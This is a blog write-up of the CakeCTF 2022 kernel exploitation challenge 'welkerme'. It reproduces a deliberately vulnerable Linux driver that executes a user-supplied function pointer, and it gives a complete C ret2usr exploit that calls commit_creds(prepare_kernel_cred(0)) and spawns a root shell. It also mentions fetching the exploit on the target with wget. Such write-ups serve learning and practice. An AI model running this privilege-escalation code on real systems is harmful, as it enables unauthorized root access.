<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="CakeCTF-22 Pwn welkerme" /><meta property="og:locale" content="en" /><meta name="description" content="Challenge Overview welkerme is a basic introduction to kernel exploitation type of CTF challenge, the challenge files provided itself have so much information to solve the challenge." /><meta property="og:description" content="Challenge Overview welkerme is a basic introduction to kernel exploitation type of CTF challenge, the challenge files provided itself have so much information to solve the challenge." /><link rel="canonical" href="/posts/CakeCTF-2022-welkerme/" /><meta property="og:url" content="/posts/CakeCTF-2022-welkerme/" /><meta property="og:site_name" content="EsharkyTheGreat’s Personal Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-04T14:04:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CakeCTF-22 Pwn welkerme" /><meta name="twitter:site" content="@eshwars1210" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2022-09-04T14:04:00+05:30","datePublished":"2022-09-04T14:04:00+05:30","description":"Challenge Overview welkerme is a basic introduction to kernel exploitation type of CTF challenge, the challenge files provided itself have so much information to solve the challenge.","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/CakeCTF-2022-welkerme/"},"url":"/posts/CakeCTF-2022-welkerme/","@type":"BlogPosting","headline":"CakeCTF-22 Pwn welkerme","@context":"https://schema.org"}</script><title>CakeCTF-22 Pwn welkerme | EsharkyTheGreat's Personal Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="EsharkyTheGreat's Personal Blog"><meta name="application-name" content="EsharkyTheGreat's Personal Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/uchihaSasuke.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">EsharkyTheGreat's Personal Blog</a></div><div class="site-subtitle font-italic">Cyber Sec Enthusiast | Binary Exploitation | IIT(BHU)'24 | CTF w/ IIT(BHU)CyberSec'</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/EsharkyTheGreat" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/eshwars1210" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['eshwars1210','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>CakeCTF-22 Pwn welkerme</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>CakeCTF-22 Pwn welkerme</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> EsharkyTheGreat </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Sep 4, 2022, 2:04 PM +0530" >Sep 4<i class="unloaded">2022-09-04T14:04:00+05:30</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1090 words">6 min read</span></div></div><div class="post-content"><h1 id="challenge-overview">Challenge Overview</h1><p><code class="language-plaintext highlighter-rouge">welkerme</code> is a basic introduction to kernel exploitation type of CTF challenge, the challenge files provided itself have so much information to solve the challenge.</p><h2 id="challenge-files">Challenge Files</h2><p>We are given linux kernel <code class="language-plaintext highlighter-rouge">bzImage</code>, a <code class="language-plaintext highlighter-rouge">fs</code> and a vulnerable <code class="language-plaintext highlighter-rouge">driver</code> installed in it along with its source code. We are also given scripts to launch the kernel in qemu in debug and normal mode</p><h2 id="the-vulnerable-driver">The Vulnerable Driver</h2><p>Here’s the source code of the vulnerable driver -</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;linux/cdev.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/random.h&gt;
#include &lt;linux/slab.h&gt;
#include &lt;linux/uaccess.h&gt;
</span>
<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"ptr-yudai"</span><span class="p">);</span>
<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"welkerme - CakeCTF 2022"</span><span class="p">);</span>

<span class="cp">#define DEVICE_NAME "welkerme"
#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002
</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">module_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printk</span><span class="p">(</span><span class="s">"'module_open' called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">module_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printk</span><span class="p">(</span><span class="s">"'module_close' called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">module_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span>
                         <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span>
                         <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">code</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span>
  <span class="n">printk</span><span class="p">(</span><span class="s">"'module_ioctl' called with cmd=0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>

  <span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">CMD_ECHO</span><span class="p">:</span>
      <span class="n">printk</span><span class="p">(</span><span class="s">"CMD_ECHO: arg=0x%016lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">arg</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">arg</span><span class="p">;</span>

    <span class="k">case</span> <span class="n">CMD_EXEC</span><span class="p">:</span>
      <span class="n">printk</span><span class="p">(</span><span class="s">"CMD_EXEC: arg=0x%016lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">arg</span><span class="p">);</span>
      <span class="n">code</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))(</span><span class="n">arg</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">code</span><span class="p">();</span>

    <span class="nl">default:</span>
      <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">module_fops</span> <span class="o">=</span> <span class="p">{</span>
  <span class="p">.</span><span class="n">owner</span>   <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
  <span class="p">.</span><span class="n">open</span>    <span class="o">=</span> <span class="n">module_open</span><span class="p">,</span>
  <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">module_close</span><span class="p">,</span>
  <span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">module_ioctl</span>
<span class="p">};</span>

<span class="k">static</span> <span class="n">dev_t</span> <span class="n">dev_id</span><span class="p">;</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">cdev</span> <span class="n">c_dev</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">module_initialize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">alloc_chrdev_region</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">DEVICE_NAME</span><span class="p">))</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span>

  <span class="n">cdev_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_dev</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">module_fops</span><span class="p">);</span>
  <span class="n">c_dev</span><span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">cdev_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_dev</span><span class="p">,</span> <span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">unregister_chrdev_region</span><span class="p">(</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">module_cleanup</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">cdev_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_dev</span><span class="p">);</span>
  <span class="n">unregister_chrdev_region</span><span class="p">(</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">module_initialize</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">module_cleanup</span><span class="p">);</span>
</pre></table></code></div></div><p>We see that the device driver exposes an <code class="language-plaintext highlighter-rouge">ioctl</code> interface that we can interact with in userspace. The ioctl interface deals with 2 commands one that echos back the argument provided and one that takes the argument provided as function pointer and calls it. The author has also written a helper program that shows how to interact with the device driver -</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="cp">#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002
</span>
<span class="kt">int</span> <span class="nf">func</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="mi">31337</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">ret</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/welkerme"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"/dev/welkerme"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">ret</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CMD_ECHO</span><span class="p">,</span> <span class="mi">12345</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"CMD_ECHO(12345) --&gt; %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>

  <span class="n">ret</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CMD_EXEC</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">func</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"CMD_EXEC(func) --&gt; %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>

  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>When we run this we see the output -</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>CMD_ECHO<span class="o">(</span>12345<span class="o">)</span> <span class="nt">--</span><span class="o">&gt;</span> 12345
CMD_EXEC<span class="o">(</span>func<span class="o">)</span> <span class="nt">--</span><span class="o">&gt;</span> 31337
</pre></table></code></div></div><h2 id="mitigations">Mitigations</h2><p>If we look at the scripts thats booting up the kernel in qemu -</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
<span class="nb">exec </span>qemu-system-x86_64 <span class="se">\</span>
     <span class="nt">-m</span> 64M <span class="se">\</span>
     <span class="nt">-nographic</span> <span class="se">\</span>
     <span class="nt">-kernel</span> vm/bzImage <span class="se">\</span>
     <span class="nt">-append</span> <span class="s2">"console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr"</span> <span class="se">\</span>
     <span class="nt">-no-reboot</span> <span class="se">\</span>
     <span class="nt">-cpu</span> qemu64 <span class="se">\</span>
     <span class="nt">-monitor</span> /dev/null <span class="se">\</span>
     <span class="nt">-initrd</span> vm/rootfs.cpio <span class="se">\</span>
     <span class="nt">-net</span> nic,model<span class="o">=</span>virtio <span class="se">\</span>
     <span class="nt">-net</span> user
</pre></table></code></div></div><p>We see that there is no <code class="language-plaintext highlighter-rouge">kaslr</code> (its almost like ASLR but in kernel space) so symbols like <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> and <code class="language-plaintext highlighter-rouge">commit_creds</code> have fixed address which we can use. There is no <code class="language-plaintext highlighter-rouge">kpti</code> so userspace and kernel space page tables are not isolated from each other, there’s also no <code class="language-plaintext highlighter-rouge">SMEP</code> and <code class="language-plaintext highlighter-rouge">SMAP</code> so userspace pages can be accessed and executed</p><h2 id="exploit-plan">Exploit Plan</h2><p>The challenge can be simply solved by passing an address of a function that calls <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code> and returns back to userspace from where we can execute a shell or read the flag from the calling process</p><h2 id="exploit">Exploit</h2><p>I took a lot of code from <code class="language-plaintext highlighter-rouge">lkmidas</code> post which was linked in the README of the challenge and created this exploit -</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="cp">#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002
</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">save_state</span><span class="p">(){</span>
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">".intel_syntax noprefix;"</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
        <span class="s">".att_syntax;"</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Saved state"</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Returned to userland"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[*] UID: %d, got root!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getuid</span><span class="p">());</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] UID: %d, didn't get root</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getuid</span><span class="p">());</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">".intel_syntax noprefix;"</span>
        <span class="s">"movabs rax, 0xffffffff810726e0;"</span> <span class="c1">//prepare_kernel_cred</span>
        <span class="s">"xor rdi, rdi;"</span>
	    <span class="s">"call rax; mov rdi, rax;"</span>
	    <span class="s">"movabs rax, 0xffffffff81072540;"</span> <span class="c1">//commit_creds</span>
	    <span class="s">"call rax;"</span>
        <span class="s">"swapgs;"</span>
        <span class="s">"mov r15, user_ss;"</span>
        <span class="s">"push r15;"</span>
        <span class="s">"mov r15, user_sp;"</span>
        <span class="s">"push r15;"</span>
        <span class="s">"mov r15, user_rflags;"</span>
        <span class="s">"push r15;"</span>
        <span class="s">"mov r15, user_cs;"</span>
        <span class="s">"push r15;"</span>
        <span class="s">"mov r15, user_rip;"</span>
        <span class="s">"push r15;"</span>
        <span class="s">"iretq;"</span>
        <span class="s">".att_syntax;"</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">save_state</span><span class="p">();</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">ret</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/welkerme"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"/dev/welkerme"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">ret</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">CMD_EXEC</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">);</span>
  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>I copied the save_state() function from that post this is called to save some register values which would be needed afterwards to return to userspace. We then open the device and call the ioctl method to call our escalate_privs function which basically calls <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code>, I found the address of these functions in the debug build by grepping on <code class="language-plaintext highlighter-rouge">/proc/kallsyms</code>. We then return to userspace by setting back some registers that we saved already and calling <code class="language-plaintext highlighter-rouge">iretq</code>, here we also set the returning instruction pointer to a function which exectues the shell for us. Upon executing this exploit we get a shell with root priviliges, as <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code> made the calling process have root priviliges</p><h2 id="remote">Remote</h2><p>In order to execute this exploit we just need to do another step that is host our exploit on a server or there’s another way the author provided which is to host it on <code class="language-plaintext highlighter-rouge">termbin</code> or <code class="language-plaintext highlighter-rouge">sprunge</code> which are like pastebin from terminal. Once hosted we can just <code class="language-plaintext highlighter-rouge">wget</code> them on the remote server and then execute them</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pwn/'>Pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/kernel/" class="post-tag no-text-decoration" >Kernel</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span 